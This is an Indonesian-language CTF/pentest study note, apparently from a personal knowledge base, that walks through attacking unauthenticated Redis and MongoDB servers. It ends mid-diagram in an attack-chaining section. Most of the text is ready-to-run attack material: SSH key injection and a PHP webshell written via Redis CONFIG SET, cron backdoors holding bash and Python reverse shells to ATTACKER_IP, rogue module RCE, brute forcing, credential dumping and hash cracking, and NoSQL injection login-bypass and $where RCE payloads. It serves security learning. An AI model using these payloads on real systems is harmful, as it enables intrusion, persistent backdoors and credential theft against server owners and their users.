---
id: "14d"
title: "📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS"
category: "2. Network Services"
categoryId: "network"
filename: "14d_Redis & MongoDB.md"
refs_out: ["06","07","14a","14c","15","25","28","35","44","47"]
refs_in: ["04","14c","15","22","24","32"]
---

## 📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS

### 1.1 Apa itu Redis?
Redis adalah **in-memory key-value store** — database yang menyimpan data di RAM untuk akses super cepat.

```text
📌 ANALOGI REDIS:
"Papan tulis digital super cepat"
Bayangkan papan tulis raksasa di kantor:
- Tulis sesuatu di papan (SET key value)
- Baca dengan cepat (GET key)
- Hapus (DEL key)
- Semua orang di kantor bisa lihat dan tulis (tanpa auth!)
```

**Informasi Teknis Redis:**

|Properti|Nilai|
|---|---|
|Port default|6379 TCP|
|Auth default|**TIDAK ADA** (fatal!)|
|Data types|Strings, Hashes, Lists, Sets, Sorted Sets|
|Persistence|RDB (snapshot) & AOF (append-only)|
|Config file|`/etc/redis/redis.conf`|
|Data directory|`/var/lib/redis/` (Debian)|
|User running|`redis` (bisa root jika misconfigured!)|

**Kenapa Redis sering ada di CTF?**

```text
⚠️ FAKTOR UTAMA:
1. Developer lupa set requirepass di redis.conf
2. Redis bind ke 0.0.0.0 (semua interface)
3. protected-mode dimatikan (atau tidak efektif)
4. Redis berjalan sebagai root (misconfiguration)
5. Banyak aplikasi web pakai Redis tanpa auth
```

### 1.2 Kenapa Redis Berbahaya Tanpa Auth?

Ini adalah **kekuatan utama Redis** untuk pentester:

```text
🔥 KOMBINASI MEMATIKAN:
CONFIG SET dir → Ubah direktori kerja Redis
+
CONFIG SET dbfilename → Ubah nama file output
=
TULIS FILE KE MANA SAJA sebagai user redis!
📌 Bandingkan dengan MySQL:
- MySQL: butuh FILE privilege + dir tertentu
- Redis: TIDAK butuh privilege khusus untuk CONFIG SET
```

**File yang bisa ditulis via Redis:**

```text
📁 TARGET FILE WRITE:
1. ~/.ssh/authorized_keys → SSH login sebagai user redis
2. /var/spool/cron/crontabs/root → Cron backdoor (root!)
3. /var/www/html/shell.php → Webshell
4. /etc/ld.so.preload → Library preload (advanced)
5. /etc/passwd → (hati-hati, bisa brick system)
6. /root/.ssh/authorized_keys → jika Redis root
```

### 1.3 Apa itu MongoDB?

MongoDB adalah **document database (NoSQL)** — menyimpan data dalam format dokumen seperti JSON.

```text
📌 ANALOGI MONGODB:
"Lemari arsip JSON raksasa"
Bayangkan lemari dengan banyak rak (database):
- Setiap rak punya binder (collection)
- Setiap binder berisi lembaran (document)
- Setiap lembaran berisi data JSON
- Tidak butuh struktur tabel yang kaku
```

**Informasi Teknis MongoDB:**

|Properti|Nilai|
|---|---|
|Port default|27017 TCP|
|Auth default|**TIDAK ADA** (versi lama)|
|Data format|BSON (Binary JSON)|
|Query language|MongoDB Query Language|
|Config file|`/etc/mongod.conf`|
|Data directory|`/var/lib/mongodb/`|
|User running|`mongodb`|

**Kenapa MongoDB sering ada di CTF:**

```text
⚠️ FAKTOR UTAMA:
1. MongoDB versi lama tidak ada auth default
2. Admin lupa enable authentication
3. Bind ke 0.0.0.0 tanpa firewall
4. Aplikasi web gunakan MongoDB tanpa auth
5. Mudah di-dump semua datanya
```

### 1.4 Perbandingan Redis vs MongoDB

```text
┌──────────────────┬─────────────────────┬─────────────────────┐
│     ASPEK        │       REDIS         │      MONGODB        │
├──────────────────┼─────────────────────┼─────────────────────┤
│ Port             │ 6379                │ 27017               │
│ Auth Default     │ ❌ Tidak ada        │ ❌ Tidak ada        │
│ Data Model       │ Key-Value           │ Document (BSON)     │
│ Primary Attack   │ File Write (RCE)    │ Data Dump + NoSQL   │
│                  │ SSH Key / Cron      │ Injection           │
│ Tool Utama       │ redis-cli           │ mongosh / mongo     │
│ Install Package  │ redis-tools         │ mongodb-mongosh     │
│ CTF Popularitas  │ ⭐⭐⭐⭐⭐ (sangat) │ ⭐⭐⭐⭐ (sering)    │
│ Exploit Target   │ File System         │ Data + Web App      │
└──────────────────┴─────────────────────┴─────────────────────┘
```

---

## 🛠️ BAGIAN 2: TOOL ARSENAL

### 2.1 Redis Tools

#### Install Redis Client Tools

```bash
# Install redis-tools di Parrot OS (Debian-based)
sudo apt update
sudo apt install redis-tools -y
# Verifikasi install
redis-cli --version
# Output: redis-cli 7.x.x
```

#### Redis Client Commands

```bash
# Koneksi dasar tanpa auth
redis-cli -h TARGET -p 6379
# Koneksi dengan auth (password)
redis-cli -h TARGET -p 6379 -a PASSWORD
# Satu-liner command (tanpa interactive)
redis-cli -h TARGET -p 6379 PING
redis-cli -h TARGET -p 6379 INFO server
redis-cli -h TARGET -p 6379 CONFIG GET dir
# Koneksi dengan auth di dalam interactive
redis-cli -h TARGET -p 6379
127.0.0.1:6379> AUTH PASSWORD
127.0.0.1:6379> PING
```

#### Other Tools untuk Redis

```bash
# Nmap NSE scripts
nmap -p 6379 --script redis-info TARGET
nmap -p 6379 --script redis-brute TARGET
# NetExec (CrackMapExec) redis module
nxc redis TARGET -u '' -p '' --shares
nxc redis TARGET -u '' -p '' --redis
# Metasploit modules
msf6 > use auxiliary/scanner/redis/redis_server
msf6 > use exploit/linux/redis/redis_unauth_exec
```

### 2.2 MongoDB Tools

#### Install MongoDB Shell (mongosh)

```bash
# Install mongosh di Parrot OS
# Method 1: Direct download
wget -qO - https://www.mongodb.org/static/pgp/server-7.0.asc | sudo apt-key add -
echo "deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu jammy/mongodb-org/7.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-7.0.list
sudo apt update
sudo apt install mongodb-mongosh -y
# Method 2: Install via npm (alternatif)
sudo npm install -g mongosh
# Verifikasi
mongosh --version
# Output: 2.x.x
```

#### MongoDB Client Commands

```bash
# Koneksi tanpa auth
mongosh "mongodb://TARGET:27017"
# Koneksi dengan auth
mongosh "mongodb://user:pass@TARGET:27017/admin"
# Koneksi ke database spesifik
mongosh "mongodb://TARGET:27017/mydb"
# Satu-liner command
mongosh "mongodb://TARGET:27017" --eval "show dbs"
mongosh "mongodb://TARGET:27017" --eval "db.version()"
```

#### Other Tools untuk MongoDB

```bash
# Nmap NSE scripts
nmap -p 27017 --script mongodb-info TARGET
nmap -p 27017 --script mongodb-brute TARGET
# Metasploit modules
msf6 > use auxiliary/scanner/mongodb/mongodb_login
msf6 > use auxiliary/admin/mongodb/mongodb_enum
```

---

## 🚀 BAGIAN 3: REDIS WORKFLOW UTAMA

### FASE 1: DETEKSI REDIS (PORT 6379)

#### Nmap Scan untuk Redis

```bash
# Scan port 6379
nmap -p 6379 -sV TARGET
# Scan dengan NSE script redis-info
nmap -p 6379 --script redis-info TARGET
# Full scan dengan versi
nmap -p 6379 -sC -sV TARGET
# Masscan untuk cepat
masscan -p6379 TARGET --rate=10000
```

**Contoh Output Nmap Redis:**

```text
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 6.0.16
| redis-info:
|   Version: 6.0.16
|   Operating System: Linux 5.10.0
|   Architecture: 64 bits
|   Process ID: 1234
|   Used Memory: 1.23M
|   Connected Clients: 1
|   Replication: master
|_  Config File: /etc/redis/redis.conf
```

#### Banner Grab dengan Netcat

```bash
# Banner grab manual
nc -vn TARGET 6379
# Ketik: PING
# Response: +PONG
# Atau satu-liner
echo -e "PING\r\n" | nc -vn TARGET 6379
```

**Contoh Output Banner Grab:**

```text
$ nc -vn 10.10.10.100 6379
(UNKNOWN) [10.10.10.100] 6379 (?) open
PING
+PONG
INFO server
$redis_version:6.0.16
$redis_git_sha1:00000000
$redis_git_dirty:0
$redis_build_id:abc123
$redis_mode:standalone
$os:Linux 5.10.0 x86_64
$arch_bits:64
...
```

### FASE 2: AUTENTIKASI REDIS

#### Test Tanpa Password

```bash
# Test basic tanpa password
redis-cli -h TARGET -p 6379 PING
# Jika response +PONG → Unauthenticated (VULNERABLE!)
# Test lebih detail
redis-cli -h TARGET -p 6379 INFO server
# Jika berhasil → FULL ACCESS tanpa auth!
```

#### Test Dengan Password (Brute Force)

```bash
# Hydra untuk brute force Redis
hydra -P /usr/share/wordlists/rockyou.txt redis://TARGET:6379
# Atau dengan redis-cli manual
redis-cli -h TARGET -p 6379 -a PASSWORD PING
# +PONG berarti password benar
# AUTH command di dalam interactive
redis-cli -h TARGET -p 6379
127.0.0.1:6379> AUTH PASSWORD
OK
127.0.0.1:6379> PING
+PONG
```

#### Contoh Response Authenticated vs Unauthenticated

```text
✅ UNAUTHENTICATED (tanpa password):
$ redis-cli -h 10.10.10.100 PING
+PONG
✅ AUTHENTICATED (dengan password):
$ redis-cli -h 10.10.10.100 -a admin123 PING
+PONG
❌ AUTH FAILED:
$ redis-cli -h 10.10.10.100 -a wrongpass PING
(error) NOAUTH Authentication required.
📌 TIPS: Jika dapat "NOAUTH", berarti ada password.
Coba brute force atau cari di file config/web app.
```

### FASE 3: REDIS RECONNAISSANCE

Setelah berhasil konek, jalankan reconnaissance lengkap:

#### Command Wajib Redis Recon

```bash
# 1. INFO server → versi, OS, memory, process
redis-cli -h TARGET INFO server
# 2. INFO keyspace → database yang ada
redis-cli -h TARGET INFO keyspace
# 3. CONFIG GET dir → direktori kerja saat ini
redis-cli -h TARGET CONFIG GET dir
# 4. CONFIG GET dbfilename → nama file database
redis-cli -h TARGET CONFIG GET dbfilename
# 5. CONFIG GET requirepass → apakah ada password
redis-cli -h TARGET CONFIG GET requirepass
# 6. KEYS * → list semua keys (HATI-HATI di production!)
redis-cli -h TARGET KEYS "*"
# 7. DBSIZE → jumlah total keys
redis-cli -h TARGET DBSIZE
# 8. TYPE key → tipe data sebuah key
redis-cli -h TARGET TYPE key_name
# 9. GET key → baca value string
redis-cli -h TARGET GET key_name
# 10. HGETALL key → baca semua field hash
redis-cli -h TARGET HGETALL key_name
# 11. SMEMBERS key → baca semua anggota set
redis-cli -h TARGET SMEMBERS key_name
# 12. LRANGE key 0 -1 → baca semua anggota list
redis-cli -h TARGET LRANGE key_name 0 -1
```

**Contoh Output Recon:**

```text
$ redis-cli -h 10.10.10.100 CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
$ redis-cli -h 10.10.10.100 CONFIG GET dbfilename
3) "dbfilename"
4) "dump.rdb"
$ redis-cli -h 10.10.10.100 INFO keyspace
# Keyspace
db0: keys=5, expires=0, avg_ttl=0
$ redis-cli -h 10.10.10.100 KEYS "*"
1) "user:admin"
2) "session:abc123"
3) "config:app"
4) "cache:page1"
5) "flag"
$ redis-cli -h 10.10.10.100 GET flag
"HTB{redis_unauth_flag}"
```

### FASE 4: FILE WRITE VIA REDIS (ATTACK VECTOR UTAMA)

Ini adalah **serangan paling powerful** dari Redis — menulis file ke sistem!

#### 4a. SSH Key Injection (Paling Umum di CTF)

```text
📌 TUJUAN: Inject public key ke ~/.ssh/authorized_keys
📌 HASIL: SSH login sebagai user yang menjalankan Redis
📌 TARGET: Biasanya user 'redis' atau 'root'
```

**STEP-BY-STEP SSH KEY INJECTION:**

```bash
# STEP 1: Generate SSH keypair di Parrot OS
ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
# STEP 2: Lihat public key
cat ~/.ssh/redis_exploit.pub
# Output: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... user@parrot
# STEP 3: Format payload dengan newlines (WAJIB!)
# Public key HARUS dibungkus newline agar Redis memparsing dengan benar
echo -e "\n\n$(cat ~/.ssh/redis_exploit.pub)\n\n" > /tmp/redis_key.txt
cat /tmp/redis_key.txt
# STEP 4: Konek ke Redis dan inject
redis-cli -h TARGET
# STEP 4a: FLUSHALL (hapus data untuk output bersih)
127.0.0.1:6379> FLUSHALL
OK
# STEP 4b: Set working directory ke .ssh user redis
127.0.0.1:6379> CONFIG SET dir /home/redis/.ssh/
OK
# STEP 4c: Set filename ke authorized_keys
127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
OK
# STEP 4d: Set key dengan public key (GANTI DENGAN PUBLIC KEY ANDA!)
127.0.0.1:6379> SET pubkey "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... user@parrot\n\n"
OK
# STEP 4e: SAVE untuk menulis ke disk
127.0.0.1:6379> SAVE
OK
# STEP 5: SSH login sebagai user redis
ssh -i ~/.ssh/redis_exploit redis@TARGET
# Atau jika Redis berjalan sebagai root:
ssh -i ~/.ssh/redis_exploit root@TARGET
```

**Contoh Output Lengkap:**

```text
$ ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
Generating public/private rsa key pair.
Your identification has been saved in ~/.ssh/redis_exploit
Your public key has been saved in ~/.ssh/redis_exploit.pub
$ cat ~/.ssh/redis_exploit.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot
$ redis-cli -h 10.10.10.100
127.0.0.1:6379> FLUSHALL
OK
127.0.0.1:6379> CONFIG SET dir /home/redis/.ssh/
OK
127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
OK
127.0.0.1:6379> SET pubkey "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot\n\n"
OK
127.0.0.1:6379> SAVE
OK
127.0.0.1:6379> exit
$ ssh -i ~/.ssh/redis_exploit redis@10.10.10.100
Last login: Mon Jan 20 10:00:00 2025 from 10.10.14.10
redis@target:~$ id
uid=999(redis) gid=999(redis) groups=999(redis)
redis@target:~$ whoami
redis
```

**⚠️ TROUBLESHOOTING SSH INJECTION:**

```text
❌ "Permission denied (publickey)" → Kemungkinan:
   - Dir /home/redis/.ssh/ tidak ada → buat dulu
   - Permission .ssh harus 700
   - Redis tidak berjalan sebagai user redis (cek ps aux)
   SOLUSI:
   - Coba dir /var/lib/redis/.ssh/
   - Coba dir /root/.ssh/ (jika Redis root)
   - Buat .ssh directory via Redis file write terlebih dahulu:
     CONFIG SET dir /home/redis/
     CONFIG SET dbfilename .ssh
     SET dummy ""; SAVE
     Lalu inject key ke .ssh/authorized_keys
```

#### 4b. Cron Job Backdoor (Untuk Root Shell)

```text
📌 TUJUAN: Buat cron job yang execute reverse shell setiap menit
📌 HASIL: Root shell (jika Redis berjalan sebagai root)
📌 KRITIS: Redis HARUS root atau /var/spool/cron writable
```

**STEP-BY-STEP CRON BACKDOOR:**

```bash
# STEP 1: Setup listener di attacker
nc -lvnp 4444
# STEP 2: Konek ke Redis dan inject cron
redis-cli -h TARGET
# STEP 3: Set directory ke cron (Root user)
127.0.0.1:6379> CONFIG SET dir /var/spool/cron/crontabs/
OK
# STEP 4: Set filename ke 'root'
127.0.0.1:6379> CONFIG SET dbfilename root
OK
# STEP 5: Set cron payload (GANTI IP dan PORT!)
127.0.0.1:6379> SET cron "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
OK
# STEP 6: SAVE
127.0.0.1:6379> SAVE
OK
# STEP 7: Tunggu 1 menit, shell akan masuk
# nc listener akan menerima koneksi
```

**Contoh Output Cron Backdoor:**

```text
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.100 54321
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
root@target:~# whoami
root
root@target:~# hostname
target
```

**Alternatif Cron Payload:**

```bash
# Untuk Debian/Ubuntu (format berbeda)
# Coba dir: /etc/cron.d/
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename redis_backdoor
# Payload dengan shebang
SET cron "\n\n* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
# Payload reverse shell Python (lebih reliable)
SET cron "\n\n* * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
```

#### 4c. Webshell Drop

```text
📌 TUJUAN: Drop PHP webshell di web directory
📌 HASIL: Web shell untuk RCE
📌 TARGET: /var/www/html/ atau web root lainnya
```

**STEP-BY-STEP WEBSHELL DROP:**

```bash
redis-cli -h TARGET
# Cari web root (biasanya /var/www/html/)
127.0.0.1:6379> CONFIG SET dir /var/www/html/
OK
127.0.0.1:6379> CONFIG SET dbfilename shell.php
OK
# Webshell sederhana
127.0.0.1:6379> SET webshell "<?php system($_GET['cmd']); ?>"
OK
127.0.0.1:6379> SAVE
OK
# Access webshell
curl http://TARGET/shell.php?cmd=id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Webshell Variations:**

```bash
# More powerful webshell
SET webshell "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?>"
# One-liner reverse shell via webshell
curl "http://TARGET/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```

### FASE 5: RCE VIA REDIS MODULE LOADING

```text
📌 TUJUAN: Load malicious shared library (.so) untuk RCE
📌 VERSI: Redis 4.x - 7.x (module support)
📌 SUMBER: redis-rogue-server atau exploit-db
```

#### Apa itu Redis Module?

```text
Redis modules adalah shared library (.so) yang bisa di-load
untuk menambah fungsionalitas Redis.
🔥 KEKUATAN: Module bisa mengeksekusi system command
🔥 KONDISI: Redis harus berjalan sebagai root (atau user dengan
   permission untuk load module)
```

#### Step-by-Step Redis Module Exploit

```bash
# STEP 1: Clone redis-rogue-server
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server
# STEP 2: Compile exploit module
cd RedisModulesSDK/
make
# STEP 3: Jalankan rogue server
python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost ATTACKER_IP --lport 4444
# STEP 4: Atau manual dengan redis-cli
redis-cli -h TARGET
# Upload module ke target (via FTP/HTTP atau CONFIG SET?)
# MODULE LOAD /path/to/exploit.so
127.0.0.1:6379> MODULE LOAD /tmp/exp.so
OK
# Jalankan system command via module
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)"
```

**⚠️ CATATAN PENTING:**

```text
Module loading membutuhkan:
1. Redis versi 4.x ke atas
2. Redis berjalan sebagai root (atau user dengan write access ke /tmp)
3. Kemampuan upload file .so ke target
4. Di CTF, biasanya ini adalah "last resort" jika file write gagal
```

### FASE 6: REDIS PERSISTENCE MECHANISMS

```text
📌 RDB (Redis Database Backup):
   - Snapshot periodic
   - File: dump.rdb
   - Default: setiap 15 menit
📌 AOF (Append Only File):
   - Log semua operasi write
   - File: appendonly.aof
   - Lebih durable tapi lebih besar
📌 CARA MATIKAN PERSISTENCE setelah exploit:
   - CONFIG SET save ""
   - CONFIG SET appendonly no
```

---

## 🍃 BAGIAN 4: MONGODB WORKFLOW UTAMA

### FASE 1: DETEKSI MONGODB (PORT 27017)

#### Nmap Scan untuk MongoDB

```bash
# Scan port 27017
nmap -p 27017 -sV TARGET
# Dengan NSE script
nmap -p 27017 --script mongodb-info TARGET
# Full scan
nmap -p 27017 -sC -sV TARGET
```

**Contoh Output Nmap MongoDB:**

```text
PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 4.4.28
| mongodb-info:
|   MongoDB Build Info:
|     version: 4.4.28
|     gitVersion: abc123
|     allocator: tcmalloc
|     javascriptEngine: mozjs
|     sysInfo: Linux 5.10.0
|   MongoDB Server Parameters:
|     maxConnections: 65536
|     net.maxIncomingConnections: 65536
|_    net.port: 27017
```

#### Banner Grab dengan Netcat

```bash
# Banner grab basic
nc -vn TARGET 27017
# MongoDB mengembalikan header setelah koneksi
# Dengan telnet (bisa juga)
echo "db.version()" | nc -vn TARGET 27017
```

### FASE 2: AUTENTIKASI MONGODB

#### Test Tanpa Password

```bash
# Koneksi tanpa auth
mongosh "mongodb://TARGET:27017"
# Atau dengan mongo (legacy)
mongo --host TARGET --port 27017
# Test dengan eval
mongosh "mongodb://TARGET:27017" --eval "db.version()"
```

**Contoh Response:**

```text
$ mongosh "mongodb://10.10.10.100:27017"
Current Mongosh Log ID: abc123
Connecting to: mongodb://10.10.10.100:27017
Using MongoDB: 4.4.28
Using Mongosh: 2.0.0
test> show dbs
admin   40.00 KiB
config  12.00 KiB
local   72.00 KiB
appdb   1.20 MiB
users   800.00 KiB
test> ✅ AKSES DAPAT! → Tidak ada auth!
```

#### Test Dengan Autentikasi

```bash
# Koneksi dengan username/password
mongosh "mongodb://admin:password@TARGET:27017/admin"
# Atau interactive
mongosh "mongodb://TARGET:27017"
test> use admin
test> db.auth("admin", "password")
1  # → Berhasil (return 1)
```

#### Cara Cek Apakah Auth Required

```bash
# Method 1: Coba akses database admin
mongosh "mongodb://TARGET:27017" --eval "use admin; db.getUsers()"
# Method 2: Cek di config
mongosh "mongodb://TARGET:27017" --eval "db.adminCommand({getParameter:1, authenticationMechanisms:1})"
# Method 3: Lihat output connection
# Jika ada "Unauthorized" → auth enabled
```

### FASE 3: MONGODB RECONNAISSANCE

Setelah konek, jalankan reconnaissance lengkap:

#### Command Wajib MongoDB Recon

```bash
# 1. show dbs → list databases
mongosh "mongodb://TARGET:27017" --eval "show dbs"
# 2. use database_name → pilih database
mongosh "mongodb://TARGET:27017" --eval "use appdb"
# 3. show collections → list collections (tables)
mongosh "mongodb://TARGET:27017/appdb" --eval "show collections"
# 4. db.collection.find() → dump semua documents
mongosh "mongodb://TARGET:27017/appdb" --eval "db.users.find()"
# 5. db.collection.find().limit(5) → limit output
mongosh "mongodb://TARGET:27017/appdb" --eval "db.users.find().limit(5)"
# 6. db.collection.count() → jumlah documents
mongosh "mongodb://TARGET:27017/appdb" --eval "db.users.count()"
# 7. db.getUsers() → list users (jika admin)
mongosh "mongodb://TARGET:27017/admin" --eval "db.getUsers()"
# 8. db.version() → versi MongoDB
mongosh "mongodb://TARGET:27017" --eval "db.version()"
# 9. db.serverStatus() → info server
mongosh "mongodb://TARGET:27017" --eval "db.serverStatus()"
# 10. db.collection.findOne() → satu document saja
mongosh "mongodb://TARGET:27017/appdb" --eval "db.users.findOne()"
```

**Contoh Output Recon MongoDB:**

```text
$ mongosh "mongodb://10.10.10.100:27017/appdb"
test> show collections
users
products
orders
sessions
test> db.users.find()
[
  { _id: ObjectId("..."), username: "admin", password: "admin123" },
  { _id: ObjectId("..."), username: "john", password: "password123" },
  { _id: ObjectId("..."), username: "jane", password: "jane2024" }
]
test> db.users.count()
3
test> db.users.findOne()
{ _id: ObjectId("..."), username: "admin", password: "admin123" }
```

### FASE 4: CREDENTIAL EXTRACTION MONGODB

#### Dump User Credentials

```bash
# Dump system users (hash)
mongosh "mongodb://TARGET:27017/admin" --eval "db.system.users.find()"
# Format output pretty
mongosh "mongodb://TARGET:27017/admin" --eval "db.system.users.find().pretty()"
# Dump semua credentials di database aplikasi
mongosh "mongodb://TARGET:27017/appdb" --eval "db.users.find()"
mongosh "mongodb://TARGET:27017/appdb" --eval "db.accounts.find()"
mongosh "mongodb://TARGET:27017/appdb" --eval "db.admins.find()"
mongosh "mongodb://TARGET:27017/appdb" --eval "db.credentials.find()"
mongosh "mongodb://TARGET:27017/appdb" --eval "db.auth.find()"
# Export ke file
mongosh "mongodb://TARGET:27017/appdb" --eval "JSON.stringify(db.users.find().toArray())" > users.json
```

**Contoh System Users Output:**

```text
$ mongosh "mongodb://10.10.10.100:27017/admin" --eval "db.system.users.find().pretty()"
[
  {
    _id: "admin.admin",
    userId: UUID("..."),
    user: "admin",
    db: "admin",
    credentials: {
      'SCRAM-SHA-256': {
        iterationCount: 10000,
        salt: "abc123...",
        storedKey: "...",
        serverKey: "..."
      }
    },
    roles: [ { role: "root", db: "admin" } ]
  }
]
```

#### Crack MongoDB Hashes

```bash
# MongoDB menggunakan SCRAM-SHA-256
# Format hash: <username>:<db>:<salt>:<storedKey>:<serverKey>
# Gunakan hashcat mode 24100 (MongoDB SCRAM-SHA-256)
hashcat -m 24100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Atau mode 24200 (MongoDB SCRAM-SHA-1 untuk versi lama)
hashcat -m 24200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### FASE 5: NOSQL INJECTION

```text
📌 APA ITU NOSQL INJECTION?
NoSQL injection terjadi ketika input user tidak disanitasi
dan digunakan langsung dalam query MongoDB.
```

#### Operator MongoDB yang Sering Diserang

```text
┌────────────────┬──────────────────────────────────────┐
│   OPERATOR     │         FUNGSI                      │
├────────────────┼──────────────────────────────────────┤
│ $eq            │ Equal / Sama dengan                 │
│ $ne            │ Not Equal / Tidak sama              │
│ $gt            │ Greater Than / Lebih dari           │
│ $lt            │ Less Than / Kurang dari             │
│ $where         │ JavaScript execution (RCE!)         │
│ $regex         │ Regular expression                  │
│ $in            │ In array                            │
│ $nin           │ Not in array                        │
│ $or            │ Or condition                        │
│ $and           │ And condition                       │
└────────────────┴──────────────────────────────────────┘
```

#### Bypass Login dengan NoSQL Injection

**Method 1: URL Encoded Parameter (PHP/Node.js)**

```bash
# Login bypass dengan $ne (not equal)
# Email: admin@example.com&password[$ne]=1
curl -X POST http://TARGET/login \
  -d "username=admin&password[$ne]=1"
# Atau
curl -X POST http://TARGET/login \
  -d "username[$ne]=admin&password[$ne]=1"
# Login bypass dengan $gt (greater than)
curl -X POST http://TARGET/login \
  -d "username=admin&password[$gt]=a"
# Login bypass dengan $regex
curl -X POST http://TARGET/login \
  -d "username=admin&password[$regex]=.*"
# Bypass dengan array
curl -X POST http://TARGET/login \
  -d "username=admin&password[$in][]=admin&password[$in][]=admin123"
```

**Method 2: JSON Format (API/GraphQL)**

```json
// Request body JSON untuk bypass login
{
  "username": "admin",
  "password": { "$ne": "wrong" }
}
// Atau
{
  "username": { "$ne": "nonexistent" },
  "password": { "$ne": "nonexistent" }
}
// Atau dengan $gt
{
  "username": "admin",
  "password": { "$gt": "a" }
}
```

**Method 3: $where Injection (RCE - Versi Lama)**

```text
📌 $where mengizinkan JavaScript execution!
📌 DEPRECATED di versi modern, tapi masih ada di CTF legacy.
Payload injection:
{
  "username": "admin",
  "$where": "function() { return this.password.length > 0; }"
}
RCE payload:
{
  "$where": "function() { return this.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\").toString()')() }"
}
```

#### Contoh Exploit NoSQL Injection

```bash
# Contoh 1: Login bypass di web app
curl -X POST http://TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}'
# Response: {"token": "eyJhbGciOiJIUzI1NiIs..."}  # LOGIN BERHASIL!
# Contoh 2: Extract data dengan regex
curl -X GET "http://TARGET/api/users?search[$regex]=adm.*"
# Contoh 3: $where RCE (jika vulnerable)
curl -X POST http://TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"$where": "function() { return process.mainModule.require(\"child_process\").execSync(\"id\").toString() }"}'
```

---

## 🔗 BAGIAN 5: ATTACK CHAINING

### CHAIN 1: Redis Unauthenticated → SSH Key Injection → Shell

```text
┌─────────────────────────────────────────────────────────────────────┐
│ CHAIN 1: REDIS UNAUTH → SSH KEY → SHELL                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                   │
│  [1] SCAN               [2] REDIS                     [3] RECON   │
│  nmap -p6379 TARGET  →  redis-cli -h TARGET  →  CONFIG GET dir   │
│                        →  PING (PONG)          →  CONFIG GET db   │
│                        →  NO AUTH!             →  KEYS *          │
│                                                                   │
│         ▼                        ▼                       ▼        │
│                                                                   │
│  [4] SSH KEY GEN        [5] SET DIR                  [6] SET KEY  │
│  ssh-keygen -f exploit  CONFIG SET dir              SET pubkey   │
│  cat exploit.pub        /home/redis/.ssh/           "\n\nPUB_KEY  │
│                        →  CONFIG SET dbfilename       \n\n"       │
│                           authorized_keys                         │
│                                                                   │
│         ▼                        ▼                       ▼        │
│                                                                   │
│  [7] SAVE & EXIT        [8] SSH LOGIN                 [9] SHELL  │
│  SAVE                   ssh -i exploit              id           │
│  QUIT                   redis@TARGET                whoami       │
│                                                    hostname     │
│                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

### CHAIN 2: Redis Root → Cron Backdoor → Root Shell

```text
┌─────────────────────────────────────────────────────────────────────┐
│ CHAIN 2: REDIS ROOT → CRON → ROOT SHELL                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                   │
│  [1] Redis Root        [2] SET CRON DIR           [3] SET CRON   │
│  ps aux | grep redis   CONFIG SET dir             SET cron       │
│  → redis running as    /var/spool/cron/crontabs/  "\n\n* * * * * │
│    ROOT!               → CONFIG SET dbfilename     bash -c '...  │
│                           root                      >> /dev/tcp/  │
│                                                     ATTACKER/4444 │
│                                                     0>&1'\n\n"    │
│                                                                   │
│         ▼                        ▼                       ▼        │
│                                                                   │
│  [4] SAVE               [5] LISTENER               [6] SHELL     │
│  SAVE                   nc -lvnp 4444             id             │
│  QUIT                   (tunggu 1 menit)          whoami         │
│                                                    → root!        │
│                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

### CHAIN 3: Web App → Redis Credentials → Redis Login → SSH Key Write → Shell

```text
┌─────────────────────────────────────────────────────────────────────┐
│ CHAIN 3: WEB APP → REDIS CREDS → SSH KEY → SHELL                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                   │
│  [1] Web Recon         [2] Find Creds            [3] Redis Login │
│  Directory scan        Config file / .env        redis-cli -h    │
│  Source code          → REDIS_PASSWORD=xxx       TARGET -a PASS  │
